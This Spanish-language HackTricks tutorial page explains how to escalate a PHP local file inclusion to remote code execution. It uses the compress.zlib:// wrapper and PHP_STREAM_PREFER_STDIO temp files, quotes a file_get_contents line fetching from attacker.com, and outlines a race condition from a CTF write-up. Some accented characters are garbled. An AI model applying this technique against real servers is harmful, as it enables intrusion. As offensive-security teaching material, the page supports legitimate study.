# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### `compress.zlib://` y `PHP_STREAM_PREFER_STDIO`

Un archivo abierto utilizando el protocolo `compress.zlib://` con la bandera `PHP_STREAM_PREFER_STDIO` puede continuar escribiendo datos que lleguen a la conexi칩n m치s tarde en el mismo archivo.

Esto significa que una llamada como:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Enviar칠 una solicitud pidiendo http://attacker.com/file, luego el servidor podr칤a responder a la solicitud con una respuesta HTTP v치lida, mantener la conexi칩n abierta y enviar datos adicionales alg칰n tiempo despu칠s que tambi칠n se escribir치n en el archivo.

Puedes ver esa informaci칩n en esta parte del c칩digo php-src en main/streams/cast.c:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### Condici칩n de Carrera para RCE

[**Este CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) fue resuelto utilizando el truco anterior.

El atacante har치 que el **servidor v칤ctima abra una conexi칩n leyendo un archivo desde el servidor del atacante** utilizando el protocolo **`compress.zlib`**.

**Mientras** esta **conexi칩n** exista, el atacante **exfiltrar치 la ruta** al archivo temporal creado (es filtrado por el servidor).

**Mientras** la **conexi칩n** siga abierta, el atacante **explotar치 un LFI cargando el archivo temporal** que controla.

Sin embargo, hay una verificaci칩n en el servidor web que **previene cargar archivos que contengan `<?`**. Por lo tanto, el atacante abusar치 de una **Condici칩n de Carrera**. En la conexi칩n que a칰n est치 abierta, el **atacante** **enviar치 la carga 칰til de PHP DESPU칄S** de que el **servidor web** haya **verificado** si el archivo contiene los caracteres prohibidos, pero **ANTES de cargar su contenido**.

Para m치s informaci칩n, consulta la descripci칩n de la Condici칩n de Carrera y el CTF en [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
